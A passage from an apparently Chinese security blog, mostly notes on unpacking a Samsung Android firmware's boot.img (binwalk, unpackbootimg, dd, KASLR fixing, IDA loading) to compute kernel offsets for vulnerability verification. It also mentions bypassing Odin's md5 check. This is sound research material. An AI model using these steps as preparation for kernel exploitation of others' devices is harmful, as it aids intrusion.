class_">MyRunnable</span>()).start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.onStartCommand(intent, flags, startId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyRunnable</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">15</span>; i++) &#123;</span><br><span class="line">                Log.e(<span class="string">&quot;postNotification&quot;</span>,<span class="string">&quot;Run Count: &quot;</span> + i);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://buffer0verflooow.github.io/2022/06/23/Android%E5%86%85%E6%A0%B8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="buffer0verflooow">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/06/23/Android%E5%86%85%E6%A0%B8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="post-title-link" itemprop="url">Android内核信息收集</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2022-06-23 20:48:38 / Modified: 22:09:18" itemprop="dateCreated datePublished" datetime="2022-06-23T20:48:38+08:00">2022-06-23</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在验证Android内核漏洞时，涉及到算内核函数或数据结构偏移的问题，发现没有这方面的知识储备，于是准备收集整理记录这方面的知识。</p>
<h2 id="三星固件包"><a href="#三星固件包" class="headerlink" title="三星固件包"></a>三星固件包</h2><p>解压了一个三星的固件包中的<code>AP_G9730ZCU5FUC2_CL21058543_QB38745533_REV00_user_low_ship_MULTI_CERT_meta_OS11.tar.md5</code></p>
<blockquote>
<p><code>.tar.md5</code>指的是压缩已验证，TAR文件包含固件和其他系统数据，而<code>.MD5</code> 扩展程序验证没有数据损坏，这是三星的格式</p>
<p>直接将 <code>.tar.md5</code> 重命名为 <code>.tar</code>，然后再用 Odin 刷入，就不会校验了，不管这个线刷包有没有做 <code>.tar.md5</code> 的步骤。</p>
</blockquote>
<p>然后得到了以下文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">d-----                meta-data</span><br><span class="line">-a----       23656325 boot.img.lz4</span><br><span class="line">-a----           1292 dqmdbg.img.ext4.lz4</span><br><span class="line">-a----         953562 dtbo.img.lz4</span><br><span class="line">-a----           1923 persist.img.ext4.lz4</span><br><span class="line">-a----       37936471 recovery.img.lz4</span><br><span class="line">-a----     3299056890 system.img.ext4.lz4</span><br><span class="line">-a----     2190845341 userdata.img.ext4.lz4</span><br><span class="line">-a----           3447 vbmeta.img.lz4</span><br><span class="line">-a----      812012780 vendor.img.ext4.lz4</span><br></pre></td></tr></table></figure>

<h3 id="vbmeta镜像的作用"><a href="#vbmeta镜像的作用" class="headerlink" title="vbmeta镜像的作用"></a>vbmeta镜像的作用</h3><p>验证启动（<code>Verified Boot</code>）是Android一个重要的安全功能，主要是为了访问启动镜像被篡改，提高系统的抗攻击能力，简单描述做法就是在启动过程中增加一条校验链，即 <code>ROM code</code> 校验 <code>BootLoader</code>，确保 <code>BootLoader</code> 的合法性和完整性，<code>BootLoader</code> 则需要校验 <code>boot image</code>，确保 <code>Kernel</code> 启动所需 <code>image</code> 的合法性和完整性，而 <code>Kernel</code> 则负责校验 <code>System</code> 分区和 <code>vendor</code> 分区。</p>
<p>由于 <code>ROM code</code> 和 <code>BootLoader</code> 通常都是由设备厂商 OEM 提供，而各家实际做法和研发能力不尽相同，为了让设备厂商更方便的引入 Verified boot 功能，Google 在 Android O上推出了一个统一的验证启动框架 <code>Android verified boot 2.0</code>，好处是既保证了基于该框架开发的<code>verified boot</code> 功能能够满足 CDD 要求，也保留了各家 OEM 定制启动校验流程的弹性。</p>
<p>由于 <code>ROM code</code> 校验 <code>BootLoader</code>  的功能通常与 IC的设计相关，所以 AVB 2.0 关注的重点在 <code>BootLoader</code>  之后的校验流程。<code>BootLoader</code>  之后系统启动所涉及的关键镜像通常包括 <code>boot.img</code>，<code>system.img</code>，Android O 的 <code>treble Project</code> 还引入了 <code>dtbo </code>和 <code>vendor.img</code>。这些 <code>image</code> 挨个校验可以说费时费力，而 AVB 2.0 的做法事实上十分简单，引入一个新的分区：<code>vbmeta.img</code>（<code>verified boot metadata</code>），然后把所有需要校验的内容在编译时就计算好打包到这个分区，那么启动过程中 <code>BootLoader</code> 只需要校验 <code>vbmeta.img</code>，就能确认 <code>vbmeta</code> 内的数据是否可信。再用 <code>vbmeta</code> 中的数据去比对 <code>bootimg</code>，<code>dtbo</code>，<code>system.img</code>，<code>vendor.img</code> 即可。至于 OEM 是还需要放什么其他东西到 <code>vbmeta</code> 中，则可以由 OEM 自由定制，可以说保留了很好的客制化空间。</p>
<p>除了最基本的验证启动之外，AVB 2.0 还提供防止回滚的功能和对AB分区备份的支持，具体的可以看README文档（安卓源码<code>external/avb/README.md</code>）。</p>
<h3 id="dtbo镜像"><a href="#dtbo镜像" class="headerlink" title="dtbo镜像"></a>dtbo镜像</h3><p>设备树 (DT) 是用于描述“不可发现”硬件的命名节点和属性构成的一种数据结构。操作系统（例如在 Android 中使用的 Linux 内核）会使用 DT 来支持 Android 设备使用的各种硬件配置。硬件供应商会提供自己的 DT 源文件，接下来 Linux 会将这些文件编译到引导加载程序使用的设备树 <code>Blob (DTB)</code> 文件中。</p>
<p>参考官方文档<a target="_blank" rel="noopener" href="https://source.android.com/devices/architecture/dto">设备树叠加层</a>。</p>
<h1 id="System-镜像介绍"><a href="#System-镜像介绍" class="headerlink" title="System 镜像介绍"></a>System 镜像介绍</h1><p>System 镜像一般有两种格式，一种为 <code>ext4 image</code>，一种为 <code>sparse image</code>。</p>
<p>线刷包中的 <code>system image</code>，采用的是 <code>sparse image</code> 格式，而刷入完成直接采用 <code>dd</code> 或 <code>cat</code> 命令备份出来，则是 <code>ext4</code> 格式。</p>
<h1 id="Android内核配置提取"><a href="#Android内核配置提取" class="headerlink" title="Android内核配置提取"></a>Android内核配置提取</h1><p><code>/proc/config.gz</code></p>
<h1 id="CPU信息"><a href="#CPU信息" class="headerlink" title="CPU信息"></a>CPU信息</h1><p><code>/sys/devices/system/cpu/</code></p>
<p><code>cat /sys/devices/system/cpu/cpu7/cpufreq/cpuinfo_max_freq</code></p>
<h1 id="android系统的分区"><a href="#android系统的分区" class="headerlink" title="android系统的分区"></a>android系统的分区</h1><p>比较重要的几个分区如下：</p>
<p>1、<code>/boot</code>分区：该分区主要包含<code>android kernel</code>镜像和<code>ramdisk</code>（一种将RAM模拟为硬盘的技术，提高访问速度）。</p>
<p>2、<code>/system</code>分区：该分区主要存放<code>Android</code>框架及其相关配置，包含系统预装的<code>app</code>。</p>
<p>3、<code>/recovery</code>分区：该分区主要是备份的分区</p>
<p>4、<code>/data</code> 用户数据的存储区域</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/data/app/com.xxxx/           以包名存放应用安装文件，包括base.apk </span><br><span class="line">/lib/data/data/com.xxxx/      存放应用数据，包括sp、db等</span><br><span class="line">/data/dalvik-cache            以包名存放优化过的应用dex文件</span><br></pre></td></tr></table></figure>

<p>5、<code>/cache</code>分区：Android系统缓存区域，保存系统最常访问的数据和应用程序。</p>
<p>6、<code>/misc</code>分区：此分区包含一些系统功能设置开关和数据，比如USB设置。</p>
<p>7、<code>/sdcard</code>分区：外置存储分区</p>
<p>8、<code>/vendor</code>分区：厂商定制的分区，厂商的某些系统升级可以通过这个分区来实现。</p>
<h1 id="boot-img"><a href="#boot-img" class="headerlink" title="boot.img"></a>boot.img</h1><p><code>boot.img</code>就是<code>android</code>系统的<code>Linux</code>内核主要的镜像文件，在该文件中大致包含<code>boot header</code>，<code>kernel</code>，<code>ramdisk</code>。</p>
<p><code>boot.img</code>文件跳过<code>2K</code>的文件头之后，包含两个<code>gz</code>压缩包，一个是<code>boot.img-kernel.gz Linux</code>内核，一个是<code>boot.img-ramdisk.cpio.gz</code>，然后加上<code>ramdisk</code>文件。<code>boot.img</code>文件在针对<code>kernel</code>是有不同压缩算法来进行压缩的。</p>
<p>大致的结构图如下</p>
<p><img src="https://bbs.pediy.com/upload/attach/202103/849527_BB97KK7ZN7U8ZXD.png"></p>
<h2 id="ADB提取boot镜像"><a href="#ADB提取boot镜像" class="headerlink" title="ADB提取boot镜像"></a>ADB提取boot镜像</h2><p>从手机中提取需要用到<code>root</code>权限，这对实际漏洞来讲有些苛刻。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=/dev/block/by-name/boot of=/sdcard/boot.img</span><br></pre></td></tr></table></figure>

<p>然后使用 ADB 拖到电脑备用.</p>
<h2 id="binwalk解包"><a href="#binwalk解包" class="headerlink" title="binwalk解包"></a>binwalk解包</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"> » python3 /usr/local/lib/python3.8/dist-packages/binwalk-2.3.3-py3.8.egg/binwalk boot.img</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             Android bootimg, kernel size: 50209697 bytes, kernel addr: 0x8000, ramdisk size: 0 bytes, ramdisk addr: 0x0, product name: <span class="string">&quot;RILRI20B005&quot;</span></span><br><span class="line">169252        0x29524         SHA256 <span class="built_in">hash</span> constants, little endian</span><br><span class="line">185108        0x2D314         SHA256 <span class="built_in">hash</span> constants, little endian</span><br><span class="line">188820        0x2E194         AES Inverse S-Box</span><br><span class="line">16556401      0xFCA171        Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 21129</span><br><span class="line">24670228      0x1787014       ELF, 64-bit LSB shared object, version 1 (SYSV)</span><br><span class="line">24693124      0x178C984       gzip compressed data, maximum compression, from Unix, last modified: 1970-01-01 00:00:00 (null <span class="built_in">date</span>)</span><br><span class="line">25614492      0x186D89C       Compiled Java class data, version 0.0</span><br><span class="line">25621020      0x186F21C       Compiled Java class data, version 0.0</span><br><span class="line">25644484      0x1874DC4       Compiled Java class data, version 0.0</span><br><span class="line">25651012      0x1876744       Compiled Java class data, version 0.0</span><br><span class="line">25876272      0x18AD730       Zlib compressed data, compressed</span><br><span class="line">25877304      0x18ADB38       Zlib compressed data, compressed</span><br><span class="line">25877824      0x18ADD40       Zlib compressed data, default compression</span><br><span class="line">25878856      0x18AE148       Zlib compressed data, default compression</span><br><span class="line">25895274      0x18B216A       Private key <span class="keyword">in</span> DER format (PKCS header length: 4, sequence length: 799</span><br><span class="line">25972564      0x18C4F54       DES SP2, little endian</span><br><span class="line">25973076      0x18C5154       DES SP1, little endian</span><br><span class="line">25987348      0x18C8914       CRC32 polynomial table, little endian</span><br><span class="line">26020915      0x18D0C33       HTML document header</span><br><span class="line">26021215      0x18D0D5F       HTML document footer</span><br><span class="line">26693504      0x1974F80       CRC32 polynomial table, little endian</span><br><span class="line">27586276      0x1A4EEE4       ELF, 64-bit LSB shared object, version 1 (GNU/Linux)</span><br><span class="line">27587596      0x1A4F40C       Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 1087</span><br><span class="line">27588687      0x1A4F84F       Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 1169</span><br><span class="line">27589860      0x1A4FCE4       Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 1161</span><br><span class="line">27593748      0x1A50C14       ELF, 64-bit LSB shared object, version 1 (GNU/Linux)</span><br><span class="line">27595068      0x1A5113C       Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 1087</span><br><span class="line">27596159      0x1A5157F       Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 1169</span><br><span class="line">27597332      0x1A51A14       Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 1161</span><br><span class="line">27987715      0x1AB0F03       Base64 standard index table</span><br><span class="line">28041856      0x1ABE280       SHA256 <span class="built_in">hash</span> constants, little endian</span><br><span class="line">28051156      0x1AC06D4       AES Inverse S-Box</span><br><span class="line">33382378      0x1FD5FEA       Unix path: /home/dpi/qb5_8814/workspace/P4_1716/android/kernel/msm-4.14/arch/arm64/kernel/entry.S</span><br><span class="line">33941962      0x205E9CA       Unix path: /dev/block/bootdevice/by-name/param</span><br><span class="line">33946482      0x205FB72       Unix path: /dev/block/platform/soc/%s/by-name/debug</span><br><span class="line">34055474      0x207A532       Unix path: /sys/kernel/debug/dri.</span><br><span class="line">34066784      0x207D160       Unix path: /sys/kernel/debug/dri/%pd/%s</span><br><span class="line">34066849      0x207D1A1       Unix path: /sys/kernel/debug/dri/%s</span><br><span class="line">34066988      0x207D22C       Unix path: /sys/kernel/debug/dri.</span><br><span class="line">34318013      0x20BA6BD       Unix path: /sys/kernel/debug/dri/%pd/perf</span><br><span class="line">34431339      0x20D616B       Unix path: /lib/firmware/updates/4.14.190-21058543-abG9730ZCU5FUC2</span><br><span class="line">34435626      0x20D722A       Unix path: /dev/disk/by-partlabel</span><br><span class="line">34536061      0x20EFA7D       Unix path: /sys/kernel/debug/.../reset_controller</span><br><span class="line">34696677      0x2116DE5       Neighborly text, <span class="string">&quot;neighbor reportbr_req&quot;</span></span><br><span class="line">34696768      0x2116E40       Neighborly text, <span class="string">&quot;neighbor reportiled to send neighbor report request, error=%d&quot;</span></span><br><span class="line">34696844      0x2116E8C       Neighborly text, <span class="string">&quot;neighbor report request, error=%d_list&quot;</span></span><br><span class="line">34709707      0x211A0CB       Neighborly text, <span class="string">&quot;Neighbor Report frame with incorrect length %dhbor report (token = %d)&quot;</span></span><br><span class="line">34709766      0x211A106       Neighborly text, <span class="string">&quot;neighbor report (token = %d)nt with length %d&quot;</span></span><br><span class="line">34709808      0x211A130       Neighborly text, <span class="string">&quot;Neighbor Report element with length %dxx:xx:x%x:%02x&quot;</span></span><br><span class="line">34895079      0x21474E7       Base64 standard index table</span><br><span class="line">34948093      0x21543FD       PARity archive data - file number 20549</span><br><span class="line">35031879      0x2168B47       Unix path: /dev/bus/usb/%03d/%03d</span><br><span class="line">35643506      0x21FE072       Copyright string: <span class="string">&quot;Copyright(c) Pierre Ossman&quot;</span></span><br><span class="line">35706231      0x220D577       Unix path: /sys/firmware/devicetree/base</span><br><span class="line">35708171      0x220DD0B       Unix path: /sys/firmware/fdt<span class="string">&#x27;: CRC check failed</span></span><br><span class="line"><span class="string">36119484      0x22723BC       Unix path: /sys/class/sec/hall_ic/hall_detect</span></span><br><span class="line"><span class="string">36144593      0x22785D1       Unix path: /sys/class/lcd/panel/SVC_OCTA</span></span><br><span class="line"><span class="string">36147765      0x2279235       Unix path: /sys/class/lcd/panel/window_type</span></span><br><span class="line"><span class="string">36579849      0x22E2A09       Neighborly text, &quot;neighbor table overflow!s %x&quot;</span></span><br><span class="line"><span class="string">36623432      0x22ED448       Neighborly text, &quot;NeighborSolicitsdev_snmp6&quot;</span></span><br><span class="line"><span class="string">36623449      0x22ED459       Neighborly text, &quot;NeighborAdvertisementsnuse %d&quot;</span></span><br><span class="line"><span class="string">36629463      0x22EEBD7       Neighborly text, &quot;neighbor %.2x%.2x.%pM lostename link %s to %s&quot;</span></span><br><span class="line"><span class="string">36649206      0x22F38F6       Neighborly text, &quot;NeighborhHWMPactivePathTimeout&quot;</span></span><br><span class="line"><span class="string">40332015      0x2676AEF       Certificate in DER format (x509 v3), header length: 4, sequence length: 928</span></span><br><span class="line"><span class="string">40349716      0x267B014       Certificate in DER format (x509 v3), header length: 4, sequence length: 1353</span></span><br><span class="line"><span class="string">40352532      0x267BB14       Certificate in DER format (x509 v3), header length: 4, sequence length: 928</span></span><br><span class="line"><span class="string">40392092      0x268559C       ASCII cpio archive (SVR4 with no CRC), file name: &quot;dev&quot;, file name length: &quot;0x00000004&quot;, file size: &quot;0x00000000&quot;</span></span><br><span class="line"><span class="string">40392208      0x2685610       ASCII cpio archive (SVR4 with no CRC), file name: &quot;dev/console&quot;, file name length: &quot;0x0000000C&quot;, file size: &quot;0x00000000&quot;</span></span><br><span class="line"><span class="string">40392332      0x268568C       ASCII cpio archive (SVR4 with no CRC), file name: &quot;root&quot;, file name length: &quot;0x00000005&quot;, file size: &quot;0x00000000&quot;</span></span><br><span class="line"><span class="string">40392448      0x2685700       ASCII cpio archive (SVR4 with no CRC), file name: &quot;TRAILER!!!&quot;, file name length: &quot;0x0000000B&quot;, file size: &quot;0x00000000&quot;</span></span><br><span class="line"><span class="string">45887996      0x2BC31FC       Unix path: /sys/power/cpufreq_max_limit 1497600</span></span><br><span class="line"><span class="string">45888040      0x2BC3228       Unix path: /sys/power/cpufreq_max_limit -1</span></span><br><span class="line"><span class="string">46123652      0x2BFCA84       LZMA compressed data, properties: 0xC8, dictionary size: 536870912 bytes, uncompressed size: 78 bytes</span></span><br><span class="line"><span class="string">48199859      0x2DF78B3       Intel x86 or x64 microcode, pf_mask 0x8000, 2000-01-20, size 18882560</span></span><br><span class="line"><span class="string">49215524      0x2EEF824       Flattened device tree, size: 500187 bytes, version: 17</span></span><br><span class="line"><span class="string">49715711      0x2F699FF       Flattened device tree, size: 497909 bytes, version: 17</span></span><br><span class="line"><span class="string">50213620      0x2FE32F4       Flattened device tree, size: 173 bytes, version: 17</span></span><br></pre></td></tr></table></figure>

<p>博客上说的内核地址并没有，可能是三星的魔改太多：</p>
<p><img src="https://bbs.pediy.com/upload/attach/202103/849527_FZZ32HHFFGUYUG2.png"></p>
<p>可以用<code>binwalk -e</code>提取，但是效果差点。</p>
<h2 id="unpackbootimg解包"><a href="#unpackbootimg解包" class="headerlink" title="unpackbootimg解包"></a>unpackbootimg解包</h2><p>可以用这个<a target="_blank" rel="noopener" href="https://github.com/anestisb/android-unpackbootimg%E6%88%96https://github.com/osm0sis/mkbootimg%E6%8F%90%E5%8F%96%EF%BC%8C%E8%BF%98%E6%9C%89%60imgtool%60%E6%8F%90%E5%8F%96%E3%80%82">https://github.com/anestisb/android-unpackbootimg或https://github.com/osm0sis/mkbootimg提取，还有`imgtool`提取。</a></p>
<p>提取出来的结果：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">➜ ./unpackbootimg -i boot.img -o boot-out</span><br><span class="line">ANDROID! magic found at: 0</span><br><span class="line">BOARD_KERNEL_CMDLINE console=null androidboot.hardware=qcom androidboot.console=ttyMSM0 androidboot.memcg=1 lpm_levels.sleep_disabled=1 video=vfb:640x400,bpp=32,memsize=3072000 msm_rtb.filter=0x237 service_locator.enable=1 swiotlb=2048 androidboot.usbcontroller=a600000.dwc3 firmware_class.path=/vendor/firmware_mnt/image</span><br><span class="line">BOARD_KERNEL_BASE 0x00000000</span><br><span class="line">BOARD_NAME RILRI20B005</span><br><span class="line">BOARD_PAGE_SIZE 4096</span><br><span class="line">BOARD_HASH_TYPE sha1</span><br><span class="line">BOARD_KERNEL_OFFSET 0x00008000</span><br><span class="line">BOARD_RAMDISK_OFFSET 0x00000000</span><br><span class="line">BOARD_SECOND_OFFSET 0x00000000</span><br><span class="line">BOARD_TAGS_OFFSET 0x01e00000</span><br><span class="line">BOARD_OS_VERSION 11.0.0</span><br><span class="line">BOARD_OS_PATCH_LEVEL 2021-03</span><br><span class="line">BOARD_HEADER_VERSION 1</span><br><span class="line">BOARD_HEADER_SIZE 1648</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">➜ <span class="built_in">ls</span> -al</span><br><span class="line">total 98168</span><br><span class="line">drwxr-xr-x  2 DarkMatter  staff       544  6 23 21:16 .</span><br><span class="line">drwx------@ 4 DarkMatter  staff       544  6 23 21:16 ..</span><br><span class="line">-rw-r--r--  1 DarkMatter  staff        11  6 23 21:16 boot.img-base</span><br><span class="line">-rw-r--r--  1 DarkMatter  staff        12  6 23 21:16 boot.img-board</span><br><span class="line">-rw-r--r--  1 DarkMatter  staff       301  6 23 21:16 boot.img-cmdline</span><br><span class="line">-rw-r--r--  1 DarkMatter  staff         5  6 23 21:16 boot.img-hashtype</span><br><span class="line">-rw-r--r--  1 DarkMatter  staff         3  6 23 21:16 boot.img-header_version</span><br><span class="line">-rw-r--r--  1 DarkMatter  staff  50209697  6 23 21:16 boot.img-kernel</span><br><span class="line">-rw-r--r--  1 DarkMatter  staff        11  6 23 21:16 boot.img-kernel_offset</span><br><span class="line">-rw-r--r--  1 DarkMatter  staff         8  6 23 21:16 boot.img-os_patch_level</span><br><span class="line">-rw-r--r--  1 DarkMatter  staff         7  6 23 21:16 boot.img-os_version</span><br><span class="line">-rw-r--r--  1 DarkMatter  staff         5  6 23 21:16 boot.img-pagesize</span><br><span class="line">-rw-r--r--  1 DarkMatter  staff         0  6 23 21:16 boot.img-ramdisk</span><br><span class="line">-rw-r--r--  1 DarkMatter  staff        11  6 23 21:16 boot.img-ramdisk_offset</span><br><span class="line">-rw-r--r--  1 DarkMatter  staff        11  6 23 21:16 boot.img-second_offset</span><br><span class="line">-rw-r--r--  1 DarkMatter  staff        11  6 23 21:16 boot.img-tags_offset</span><br></pre></td></tr></table></figure>

<p>这里<code>boot.img-kernel</code>显示是未压缩的镜像：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜ hexdump -C -n 32 boot.img-kernel</span><br><span class="line">00000000  55 4e 43 4f 4d 50 52 45  53 53 45 44 5f 49 4d 47  |UNCOMPRESSED_IMG|</span><br><span class="line">00000010  10 e8 ee 02 00 00 96 14  00 00 00 00 00 00 08 00  |.��.............|</span><br><span class="line">00000020</span><br></pre></td></tr></table></figure>

<h2 id="imjtool解包-没测试"><a href="#imjtool解包-没测试" class="headerlink" title="imjtool解包(没测试)"></a>imjtool解包(没测试)</h2><p>这里使用<a target="_blank" rel="noopener" href="http://newandroidbook.com/tools/imjtool.html">imjtool</a>工具：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./imjtool &lt;path to boot.img&gt; extract</span><br></pre></td></tr></table></figure>

<p>解包后的文件将被放在<code>./extracted</code>目录, 分别有<code>kernel</code>(内核image), <code>kernelimage</code>(内核defconfig), <code>ramdisk</code>(ramdisk包, 通常是<code>cpio</code>格式)</p>
<h2 id="预处理Image"><a href="#预处理Image" class="headerlink" title="预处理Image"></a>预处理Image</h2><p>这里我们选择<a target="_blank" rel="noopener" href="https://github.com/nforest/droidimg">droidimg</a>来配合<code>IDA Pro</code>完成这个任务。</p>
<p><strong>跳过头部标识</strong></p>
<p><code>Linux</code>内核在生成的时候有时会在头部添加一些<a target="_blank" rel="noopener" href="https://github.com/wloot/raphael/blob/43be2402d4fa363ac6eb89431d4f49ce4d189c42/arch/arm64/boot/Makefile#L51">信息</a>, 以供<code>fastboot</code>读取. 一般来说分别是, 16字节的<code>UNCOMPRESSED_IMG</code>和4字节的大小信息。</p>
<p><strong>验证</strong></p>
<p>这里先直接使用<code>IDA Pro</code>打开未经处理的Image, 处理器类型记得选择<code>ARM Little-endian</code>(不用纠结, Android设备全是<code>Little-endian</code>), 一路确定就行。</p>
<p>切换到16进制查看器页面, 可以很清楚的看到头部有<code>UNCOMPRESSED_IMG</code>标识。</p>
<p><strong>处理</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=&lt;path to origin image&gt; of=&lt;path to patched image&gt; bs=1 skip=20</span><br></pre></td></tr></table></figure>

<p><strong>对启用kaslr的内核进行额外处理</strong></p>
<p><strong>验证</strong></p>
<p>还记得刚刚拿到的<code>kernelimage</code>不, 打开他. 搜索<code>CONFIG_RANDOMIZE_BASE=y</code>, 如果有匹配内容说明就需要进行下一步处理了</p>
<p><strong>处理</strong></p>
<p>进入<code>droidimg</code>目录并自行编译<code>fix_kaslr_arm64.c</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;fix_kaslr_arm64&gt; &lt;patch to origin image&gt; &lt;path to patched image&gt;</span><br></pre></td></tr></table></figure>

<h2 id="反编译Image"><a href="#反编译Image" class="headerlink" title="反编译Image"></a>反编译Image</h2><h3 id="安装droidimg到ida"><a href="#安装droidimg到ida" class="headerlink" title="安装droidimg到ida"></a>安装droidimg到ida</h3><p>将<code>droidimg</code>目录下的<code>vmlinux.py</code>复制进<code>IDA Pro</code>安装目录下的<code>loaders</code>里, 注意你可能需要解决相应的<code>python</code>依赖。</p>
<h3 id="打开Image"><a href="#打开Image" class="headerlink" title="打开Image"></a>打开Image</h3><p>最后用<code>IDA Pro</code>打开我们最终的Image, 文件类型选择<code>Android/Linux Kernel Image(ARM)</code>即可。</p>
